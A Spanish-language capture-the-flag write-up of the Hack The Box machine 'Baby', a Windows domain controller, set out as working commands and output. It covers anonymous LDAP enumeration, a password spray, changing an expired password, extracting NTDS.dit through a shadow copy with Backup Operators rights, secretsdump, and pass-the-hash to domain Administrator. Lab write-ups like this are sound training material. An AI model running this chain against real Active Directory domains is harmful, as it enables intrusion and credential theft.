Write-up de **Baby**, máquina Windows de Hack The Box (Controlador de Dominio). El camino: una credencial filtrada en la descripción de un usuario por LDAP anónimo, un password spray que revela una cuenta con la contraseña expirada, abuso de `SeBackupPrivilege` vía Volume Shadow Copy para extraer `NTDS.dit`, y Pass-the-Hash final contra el Administrador del dominio.

## Fase 1 — Reconocimiento

```bash
nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -T4 10.129.105.27 -oG allPorts
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -oN targeted 10.129.105.27
```

Puertos típicos de un **Domain Controller**: DNS (53), Kerberos (88), RPC/SMB (135/139/445), LDAP/LDAPS/GC (389/636/3268/3269), WinRM (5985), RDP (3389).

```bash
echo "10.129.105.27 baby.vl BabyDC.baby.vl BABYDC" | sudo tee -a /etc/hosts
```

- Dominio: `baby.vl` — NetBIOS: `BABY` — DC: `BabyDC.baby.vl`
- OS: Windows Server 2022 (build 20348)
- SMB Signing: habilitado y requerido (sin relay)

## Fase 2 — Enumeración SMB/RPC con sesión nula

```bash
netexec smb 10.129.105.27 -u '' -p '' --shares
# Null Auth:True, pero STATUS_ACCESS_DENIED al listar shares
netexec smb 10.129.105.27 -u 'guest' -p '' --shares
# STATUS_ACCOUNT_DISABLED
```

La sesión nula autentica pero no da acceso a shares ni a la política de contraseñas (`--pass-pol` no devuelve nada por falta de permisos SAMR/LSA). Toca enumerar usuarios por otra vía.

## Fase 3 — LDAP anónimo: credencial filtrada en `description`

El bind anónimo en LDAP sí funciona:

```bash
ldapsearch -x -H ldap://10.129.105.27 -b "DC=baby,DC=vl" "(objectClass=user)" sAMAccountName
```

8 usuarios (`dev`: Jacqueline.Barnett, Ashley.Webb, Hugh.George, Leonard.Dyer; `it`: Connor.Wilkinson, Joseph.Hughes, Kerry.Wilson, Teresa.Bell). Pero la clave está en no quedarse solo con `sAMAccountName` — volcando **todos** los atributos aparece oro:

```bash
ldapsearch -x -H ldap://10.129.105.27 -b "DC=baby,DC=vl" "(objectClass=user)" "*" "+"
```

```
CN=Teresa Bell → description: Set initial password to BabyStart123!
```

## Fase 4 — Password spray: una cuenta no enumerada por LDAP

El primer filtro LDAP (`(objectClass=user)` con `sAMAccountName`) se había quedado corto. Listando directamente todos los DN del dominio aparece una cuenta más que no había salido antes:

```bash
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl | grep dn
```

```
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Con `Caroline.Robinson` añadida a la lista, toca un spray contra todos los usuarios conocidos (`--no-bruteforce` para probar la misma contraseña contra cada uno, no fuerza bruta):

```bash
printf '%s\n' Jacqueline.Barnett Ashley.Webb Hugh.George Leonard.Dyer \
  Connor.Wilkinson Joseph.Hughes Kerry.Wilson Teresa.Bell Caroline.Robinson > users_clean.txt

netexec smb 10.129.105.27 -u users_clean.txt -p 'BabyStart123!' --no-bruteforce --continue-on-success
```

```
[-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
[-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

El spray confirma que la contraseña es correcta para `Caroline.Robinson`, solo que está expirada.

> **Nota:** `BabyStart123!` por sí sola no sirve contra `Teresa.Bell` (`STATUS_LOGON_FAILURE` — ya la habrán cambiado), así que el verdadero valor de la credencial filtrada está en servir de contraseña inicial para otras cuentas, no en loguearse directamente con ella.

## Fase 5 — Cambio de contraseña expirada

Active Directory permite cambiar una contraseña expirada conociendo la actual, sin necesidad de sesión completa — Impacket lo automatiza reintentando con sesión nula:

```bash
impacket-changepasswd baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.105.27 \
  -newpass 'NuevaPass123!' -protocol smb-samr
```

```
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Password was changed successfully.
```

Credenciales válidas: `Caroline.Robinson:NuevaPass123!`.

## Fase 6 — `C$` con `READ,WRITE`: pista de `Backup Operators`

```bash
netexec smb 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' --shares
```

```
ADMIN$   READ          Remote Admin
C$       READ,WRITE    Default share
```

Un usuario normal no debería tener acceso de escritura en `C$`. `SYSVOL`/`NETLOGON` no tienen nada interesante (solo las GPOs por defecto), así que el camino real es ese acceso anómalo:

```bash
netexec smb 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' --share C$ --dir 'Users/Caroline.Robinson/Desktop'
netexec smb 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' --share C$ --get-file 'Users/Caroline.Robinson/Desktop/user.txt' user.txt
```

### Flag de usuario

Descargada desde el escritorio de `Caroline.Robinson` vía `C$`.

El motivo del acceso anómalo se confirma por LDAP (el módulo `--groups` de SMB en NetExec está deprecado a favor de LDAP):

```bash
netexec ldap 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' --groups
```

```
Backup Operators   (1 miembro)
```

`Caroline.Robinson` pertenece a **Backup Operators**, que concede **`SeBackupPrivilege`**: permite saltarse las ACLs para leer cualquier archivo del sistema con herramientas que usen semántica de backup — de ahí el `READ,WRITE` en `C$`.

## Fase 7 — Descartado: DCSync y volcado directo

`SeBackupPrivilege` no es lo mismo que permisos de replicación de directorio:

```bash
netexec smb 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' --ntds
```
```
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN
```

> **Descartado — DCSync (`--ntds` / `secretsdump -just-dc`):** falla con `rpc_s_access_denied`/`ERROR_DS_DRA_BAD_DN`. `--ntds` usa el protocolo de replicación DRSUAPI, que requiere permisos de nivel Domain Admin/Enterprise Admin — Backup Operators no los tiene.

```bash
netexec smb 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!' -M backup_operator
```

> **Descartado — módulo `backup_operator`:** vuelca las colmenas `SAM`/`SYSTEM`/`SECURITY` *locales* del DC vía Remote Registry. Útil para hashes locales (`Administrator` local, no de dominio), pero no toca `NTDS.dit`.

> **Descartado — lectura directa de `NTDS.dit` vía `smbclient`:** `NT_STATUS_ACCESS_DENIED`. El archivo está bloqueado por el servicio de AD; `SeBackupPrivilege` no se aplica "pasivamente" a una lectura SMB normal — hace falta una herramienta que invoque explícitamente semántica de backup.

> **Descartado — `secretsdump -use-vss`:** `rpc_s_access_denied`. Backup Operators no tiene permisos para pedir al DC que cree la shadow copy remotamente vía RPC.

## Fase 8 — Volume Shadow Copy manual + `robocopy /b`

El camino real: conectarse por WinRM y crear la copia de sombra localmente, luego copiar `NTDS.dit` desde ahí con `robocopy /b` (modo backup, el que sí activa `SeBackupPrivilege`).

```bash
evil-winrm -i 10.129.105.27 -u 'Caroline.Robinson' -p 'NuevaPass123!'
```

> **Descartado — `diskshadow` con script generado por `echo`/`Out-File`:** el archivo de script quedaba mal formado (palabras en líneas separadas, o `diskshadow` leyendo `set verbose o` en vez de `on`) por problemas de encoding/CRLF al escribirlo desde PowerShell/cmd vía WinRM. `diskshadow` es muy estricto con el formato del script.

La alternativa sin fichero de script, más simple:

```cmd
vssadmin create shadow /for=C:
```

Expone la copia de sombra (en este caso como `Z:`). Con eso:

```cmd
robocopy /b Z:\Windows\NTDS C:\Windows\Temp NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

```bash
smbclient //10.129.105.27/C$ -U 'baby.vl/Caroline.Robinson%NuevaPass123!' \
  -c 'get Windows\Temp\NTDS.dit /tmp/NTDS.dit; get Windows\Temp\SYSTEM /tmp/SYSTEM'
```

## Fase 9 — Extracción offline y Pass-the-Hash

```bash
impacket-secretsdump -ntds /tmp/NTDS.dit -system /tmp/SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
```

Hash NT de dominio del Administrador. Pass-the-Hash directo:

```bash
netexec smb 10.129.105.27 -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
# (Pwn3d!)
```

### Flag de root

```bash
netexec smb 10.129.105.27 -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d' \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
```

## Conclusión

Baby es un recorrido clásico de AD: LDAP anónimo filtrando una contraseña en `description`, un password spray que descubre una cuenta "invisible" en LDAP por estar con la contraseña expirada, y el cambio de esa contraseña vía SAMR aprovechando que AD lo permite sin login completo. A partir de ahí, un acceso SMB anómalo delata la pertenencia a **Backup Operators**: `SeBackupPrivilege` no da DCSync, pero sí permite —con la herramienta correcta, no con una copia SMB normal— crear una Volume Shadow Copy y extraer `NTDS.dit` para un Pass-the-Hash final contra el Administrador del dominio.
